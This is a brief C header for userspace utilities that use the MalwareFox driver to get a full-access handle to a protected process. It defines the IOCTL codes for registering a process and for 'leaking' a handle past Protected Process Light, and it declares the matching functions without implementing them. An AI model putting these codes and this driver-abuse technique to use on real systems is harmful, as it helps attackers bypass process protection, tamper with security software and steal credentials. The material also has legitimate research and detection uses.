/*!
 * Userspace utilities for registering
 * and acquiring a full-access handle 
 * to a privileged process using the 
 * MalwareFox driver.
!*/
#ifndef _MLWRFOX_H_
#define _MLWRFOX_H_

/*
 * Ioctl for registering a process with
 * the driver to perform privileged 
 * actions.
*/
#define IOCTL_REG 0x80002010

/*
 * Ioctl for leaking a full access handle
 * to the requested process, even with
 * PPL enabled.
*/
#define IOCTL_LEAK 0x8000204C

BOOL RegisterProcess(HANDLE hDriver, PDWORD UserPid);
BOOL AcquireHandle(HANDLE hDriver, PDWORD UserPid, PHANDLE OutHandle);

#endif
